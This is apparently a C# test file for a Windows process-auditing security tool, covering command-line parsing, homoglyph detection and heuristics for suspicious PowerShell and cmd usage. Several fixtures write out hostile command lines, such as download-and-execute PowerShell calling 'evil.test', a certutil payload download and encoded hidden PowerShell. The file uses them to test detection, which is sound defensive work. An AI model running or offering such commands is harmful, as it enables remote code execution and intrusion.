using Sentinel.Core.Audit;
using Sentinel.Core.Audit.Process;
using Sentinel.Core.Scanning;
using Sentinel.Core.Signatures;
using Sentinel.Core.Trust;

namespace Sentinel.Core.Tests;

public class CommandLineParserTests
{
    [Theory]
    [InlineData("", new string[0])]
    [InlineData("   ", new string[0])]
    [InlineData("powershell.exe -enc AAAA", new[] { "powershell.exe", "-enc", "AAAA" })]
    [InlineData("\"C:\\Program Files\\app.exe\" -x 1", new[] { "C:\\Program Files\\app.exe", "-x", "1" })]
    [InlineData("a\tb  c", new[] { "a", "b", "c" })]
    public void Split_ParsesTokens(string input, string[] expected)
    {
        Assert.Equal(expected, CommandLineParser.Split(input));
    }

    [Fact]
    public void Split_HandlesEscapedQuotesAndBackslashes()
    {
        // \\" -> литеральная кавычка; \\\\ -> два слэша
        Assert.Equal(new[] { "a\"b" }, CommandLineParser.Split("a\\\"b"));
        Assert.Equal(new[] { "c:\\path\\" }, CommandLineParser.Split("\"c:\\path\\\\\""));
    }

    [Fact]
    public void ExtractExecutable_ReturnsFirstToken()
    {
        Assert.Equal("C:\\Windows\\System32\\svchost.exe",
            CommandLineParser.ExtractExecutable("\"C:\\Windows\\System32\\svchost.exe\" -k netsvcs"));
        Assert.Null(CommandLineParser.ExtractExecutable("   "));
    }

    [Fact]
    public void Arguments_SkipsExecutable()
    {
        Assert.Equal(new[] { "-k", "netsvcs" }, CommandLineParser.Arguments("svchost.exe -k netsvcs"));
        Assert.Empty(CommandLineParser.Arguments("single.exe"));
    }
}

public class ConfusableFolderTests
{
    [Fact]
    public void Fold_MapsCyrillicLookalikesToLatin()
    {
        // 'lsаss.exe' с кириллической 'а' (U+0430)
        var name = "ls\u0430ss.exe";
        var result = ConfusableFolder.Fold(name);
        Assert.Equal("lsass.exe", result.Skeleton);
        Assert.True(result.Changed);
        Assert.True(result.HasNonAscii);
    }

    [Fact]
    public void Fold_MapsDigitLookalikes()
    {
        Assert.Equal("explorer.exe", ConfusableFolder.Fold("exp1orer.exe").Skeleton);
        Assert.Equal("lsass.exe", ConfusableFolder.Fold("l5ass.exe").Skeleton);
    }

    [Fact]
    public void Fold_PlainAsciiUnchanged()
    {
        var result = ConfusableFolder.Fold("svchost.exe");
        Assert.False(result.Changed);
        Assert.False(result.HasNonAscii);
    }

    [Fact]
    public void ContainsNonLatinLetters_DetectsCyrillic()
    {
        Assert.True(ConfusableFolder.ContainsNonLatinLetters("ls\u0430ss.exe"));
        Assert.False(ConfusableFolder.ContainsNonLatinLetters("lsass.exe"));
        Assert.False(ConfusableFolder.ContainsNonLatinLetters("a1b2.exe"));
    }
}

public class InterpreterHeuristicsTests
{
    private static bool Has(IReadOnlyList<AuditFinding> f, string id) => f.Any(x => x.Id == id);

    [Fact]
    public void Analyze_DetectsEncodedPowerShell()
    {
        var f = InterpreterHeuristics.Analyze("powershell.exe", "powershell.exe -NoP -W Hidden -Enc SQBFAFgA");
        Assert.True(Has(f, "PROC-PS-ENCODED"));
        Assert.True(Has(f, "PROC-PS-HIDDEN"));
    }

    [Fact]
    public void Analyze_DetectsExecutionPolicyBypass()
    {
        var f = InterpreterHeuristics.Analyze("powershell.exe", "powershell -ExecutionPolicy Bypass -File x.ps1");
        Assert.True(Has(f, "PROC-PS-BYPASS"));
    }

    [Fact]
    public void Analyze_DetectsDownloadAndIex()
    {
        var f = InterpreterHeuristics.Analyze("powershell.exe",
            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')\"");
        Assert.True(Has(f, "PROC-CMD-IEX"));
        Assert.True(Has(f, "PROC-CMD-DOWNLOAD"));
        Assert.True(Has(f, "PROC-CMD-URL"));
    }

    [Fact]
    public void Analyze_DetectsBase64AndCertutil()
    {
        Assert.True(Has(InterpreterHeuristics.Analyze("cmd.exe",
            "cmd /c certutil -urlcache -f http://x.test/p.exe p.exe"), "PROC-CMD-CERTUTIL"));
        Assert.True(Has(InterpreterHeuristics.Analyze("powershell.exe",
            "powershell [Convert]::FromBase64String('QQ==')"), "PROC-CMD-BASE64"));
    }

    [Fact]
    public void Analyze_DetectsIpPortEndpoint()
    {
        var f = InterpreterHeuristics.Analyze("cmd.exe", "cmd /c app.exe 203.0.113.5:4444");
        Assert.True(Has(f, "PROC-CMD-IPPORT"));
    }

    [Fact]
    public void Analyze_CleanCommandLine_NoFindings()
    {
        Assert.Empty(InterpreterHeuristics.Analyze("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs"));
        Assert.Empty(InterpreterHeuristics.Analyze("powershell.exe", "powershell.exe -NoProfile -Command Get-Date"));
    }

    [Theory]
    [InlineData("-enc", "encodedcommand", true)]
    [InlineData("-e", "encodedcommand", true)]
    [InlineData("/enco", "encodedcommand", true)]
    [InlineData("-encx", "encodedcommand", false)]
    [InlineData("-f", "encodedcommand", false)]
    public void IsParam_MatchesPrefixes(string arg, string canonical, bool expected)
    {
        var opt = InterpreterHeuristics.NormalizeOption(arg);
        Assert.NotNull(opt);
        Assert.Equal(expected, InterpreterHeuristics.IsParam(opt!, canonical));
    }
}

public class SystemProcessPolicyTests
{
    private static SystemProcessPolicy Windows() => SystemProcessPolicy.CreateDefault(@"C:\Windows");

    [Fact]
    public void IsInAllowedLocation_SvchostInSystem32_True()
    {
        Assert.True(Windows().IsInAllowedLocation("svchost.exe", @"C:\Windows\System32\svchost.exe"));
    }

    [Fact]
    public void IsInAllowedLocation_SvchostInTemp_False()
    {
        Assert.False(Windows().IsInAllowedLocation("svchost.exe", @"C:\Users\Public\svchost.exe"));
    }

    [Fact]
    public void IsInAllowedLocation_ExplorerInWindowsRoot_True()
    {
        Assert.True(Windows().IsInAllowedLocation("explorer.exe", @"C:\Windows\explorer.exe"));
        Assert.False(Windows().IsInAllowedLocation("explorer.exe", @"C:\Windows\System32\explorer.exe"));
    }

    [Fact]
    public void IsInAllowedLocation_UnknownName_Null()
    {
        Assert.Null(Windows().IsInAllowedLocation("myapp.exe", @"C:\Apps\myapp.exe"));
    }

    [Fact]
    public void IsInAllowedLocation_NoPath_Null()
    {
        Assert.Null(Windows().IsInAllowedLocation("svchost.exe", null));
    }
}

public class ProcessAuditorTests
{
    private static ProcessAuditor Create(FileAnalyzer? fa = null) =>
        new(new ProcessAuditorOptions { SystemPolicy = SystemProcessPolicy.CreateDefault(@"C:\Windows") }, fa);

    private static ProcessAuditEntry AuditSingle(ProcessSnapshot p, FileAnalyzer? fa = null) =>
        Create(fa).Audit([p]).Entries.Single();

    [Fact]
    public void Audit_SvchostOutsideSystem32_FlagsImpersonation()
    {
        var p = new ProcessSnapshot
        {
            Pid = 1234, ParentPid = 1, Name = "svchost.exe",
            ExecutablePath = @"C:\Users\Public\svchost.exe",
        };
        var entry = AuditSingle(p);
        Assert.Contains(entry.Findings, f => f.Id == "PROC-IMPERSONATION" && f.Severity == Severity.High);
    }

    [Fact]
    public void Audit_SvchostInSystem32_NoImpersonation()
    {
        var p = new ProcessSnapshot
        {
            Pid = 1234, ParentPid = 1, Name = "svchost.exe",
            ExecutablePath = @"C:\Windows\System32\svchost.exe",
        };
        Assert.DoesNotContain(AuditSingle(p).Findings, f => f.Id == "PROC-IMPERSONATION");
    }

    [Fact]
    public void Audit_HomoglyphName_FlagsCritical()
    {
        var p = new ProcessSnapshot
        {
            Pid = 10, ParentPid = 1, Name = "ls\u0430ss.exe", // кириллическая 'а'
            ExecutablePath = @"C:\Users\Public\lsass.exe",
        };
        var entry = AuditSingle(p);
        Assert.Contains(entry.Findings, f => f.Id == "PROC-HOMOGLYPH" && f.Severity == Severity.Critical);
    }

    [Fact]
    public void Audit_GenuineSystemName_NoHomoglyph()
    {
        var p = new ProcessSnapshot
        {
            Pid = 10, ParentPid = 1, Name = "lsass.exe",
            ExecutablePath = @"C:\Windows\System32\lsass.exe",
        };
        Assert.DoesNotContain(AuditSingle(p).Findings, f => f.Id is "PROC-HOMOGLYPH" or "PROC-NONLATIN");
    }

    [Fact]
    public void Audit_EncodedPowerShell_FlagsCommandLine()
    {
        var p = new ProcessSnapshot
        {
            Pid = 50, ParentPid = 1, Name = "powershell.exe",
            ExecutablePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            CommandLine = "powershell.exe -w hidden -enc SQBFAFgA",
        };
        var entry = AuditSingle(p);
        Assert.Contains(entry.Findings, f => f.Id == "PROC-PS-ENCODED");
        Assert.Contains(entry.Findings, f => f.Id == "PROC-PS-HIDDEN");
    }

    [Fact]
    public void Audit_HighCpu_FlagsLow()
    {
        var p = new ProcessSnapshot
        {
            Pid = 99, ParentPid = 1, Name = "miner.exe",
            ExecutablePath = @"C:\Apps\miner.exe", CpuPercent = 97.5,
        };
        Assert.Contains(AuditSingle(p).Findings, f => f.Id == "PROC-HIGH-CPU");
    }

    [Fact]
    public void Audit_UnknownCpu_NoResourceFinding()
    {
        var p = new ProcessSnapshot { Pid = 99, ParentPid = 1, Name = "app.exe", CpuPercent = -1, GpuPercent = -1 };
        Assert.DoesNotContain(AuditSingle(p).Findings, f => f.Id is "PROC-HIGH-CPU" or "PROC-HIGH-GPU");
    }

    [Fact]
    public void Audit_RunsFileAnalyzerOnExecutable_SurfacingDetections()
    {
        using var tmp = new TempDir();
        var eicar = tmp.Write("payload.exe", Detection.Eicar.CreateTestFileBytes());
        var fa = new FileAnalyzer(
            new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory)),
            new UnavailableSignatureVerifier());
        var p = new ProcessSnapshot { Pid = 7, ParentPid = 1, Name = "payload.exe", ExecutablePath = eicar };

        var entry = AuditSingle(p, fa);
        Assert.NotNull(entry.FileScan);
        Assert.Equal(Verdict.Malicious, entry.FileScan!.Verdict);
        Assert.Contains(entry.Findings, f => f.Id.StartsWith("PROC-FILE-", StringComparison.Ordinal));
    }

    [Fact]
    public void Audit_CleanProcess_NoFindings()
    {
        var p = new ProcessSnapshot
        {
            Pid = 4, ParentPid = 1, Name = "notepad.exe",
            ExecutablePath = @"C:\Windows\System32\notepad.exe",
            CommandLine = "notepad.exe C:\\file.txt", CpuPercent = 2.0,
        };
        Assert.Empty(AuditSingle(p).Findings);
    }

    [Fact]
    public void Audit_MultipleProcesses_ReportAggregates()
    {
        var report = Create().Audit(
        [
            new ProcessSnapshot { Pid = 1, Name = "svchost.exe", ExecutablePath = @"C:\Windows\System32\svchost.exe" },
            new ProcessSnapshot { Pid = 2, Name = "svchost.exe", ExecutablePath = @"C:\Temp\svchost.exe" },
        ]);
        Assert.Equal(2, report.ProcessCount);
        Assert.Equal(1, report.FlaggedCount);
    }
}

public class IexBoundaryTests
{
    [Theory]
    [InlineData(@"C:\Windows\system32\msiexec.exe /V")]
    [InlineData(@"C:\Windows\system32\msiexec.exe /i C:\x\setup.msi /qn")]
    [InlineData(@"powershell.exe -File C:\scripts\iexplore-helper.ps1")]
    [InlineData(@"cmd.exe /c echo prefix-iex-suffix")]
    public void IexInsideWordsOrExecutableName_IsNotFlagged(string commandLine)
    {
        var name = System.IO.Path.GetFileName(commandLine.Split(' ')[0].Replace('\\', '/'));
        Assert.DoesNotContain(Sentinel.Core.Audit.Process.InterpreterHeuristics.Analyze(name, commandLine), f => f.Id == "PROC-CMD-IEX");
    }

    [Theory]
    [InlineData(@"powershell.exe -NoProfile -Command ""iex (New-Object Net.WebClient).DownloadString('http://x.test/a')""")]
    [InlineData(@"powershell.exe -c ""IEX $s""")]
    [InlineData(@"powershell.exe -c ""$a | Invoke-Expression""")]
    [InlineData(@"powershell.exe -c ""(iex $b)""")]
    public void RealIexOrInvokeExpression_IsFlagged(string commandLine) =>
        Assert.Contains(Sentinel.Core.Audit.Process.InterpreterHeuristics.Analyze("powershell.exe", commandLine), f => f.Id == "PROC-CMD-IEX");
}
